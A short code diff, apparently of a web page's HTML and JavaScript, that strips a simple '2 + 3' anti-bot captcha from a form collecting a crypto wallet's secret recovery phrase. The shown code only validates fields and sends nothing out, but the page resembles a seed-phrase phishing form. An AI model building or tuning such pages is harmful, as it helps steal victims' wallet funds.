@@ -202,12 +202,6 @@
 
       <div class="seed-inputs" id="seedInputs"></div>
 
-      <!-- Captcha simple anti-bot -->
-      <div style="margin: 10px 0;">
-        <label for="captchaInput">Combien font 2 + 3 ?</label>
-        <input type="text" id="captchaInput" placeholder="Votre réponse" />
-      </div>
-
       <button class="submit-btn" id="submitBtn" onclick="handleConfirm()" disabled>
         Confirm Secret Recovery Phrase
       </button>
@@ -255,10 +249,8 @@
         input.addEventListener("input", checkFieldsFilled);
       });
 
-      // Listener captcha input
-      document.getElementById("captchaInput").addEventListener("input", checkFieldsFilled);
-
       document.getElementById("submitBtn").disabled = true;
+      document.getElementById("errorMsg").style.display = "none";
     }
 
     function checkFieldsFilled() {
@@ -272,9 +264,6 @@
           break;
         }
       }
-
-      const captchaVal = document.getElementById("captchaInput").value.trim();
-      if(captchaVal === "") allFilled = false;
 
       document.getElementById("submitBtn").disabled = !allFilled;
     }
@@ -311,13 +300,6 @@
         return;
       } else {
         errorEl.style.display = "none";
-      }
-
-      // Vérifier captcha
-      const captchaInput = document.getElementById("captchaInput").value.trim();
-      if(captchaInput !== "5") {
-        alert("Réponse au captcha incorrecte.");
-        return;
       }
 
       const count = parseInt(document.getElementById("phraseLength").value);
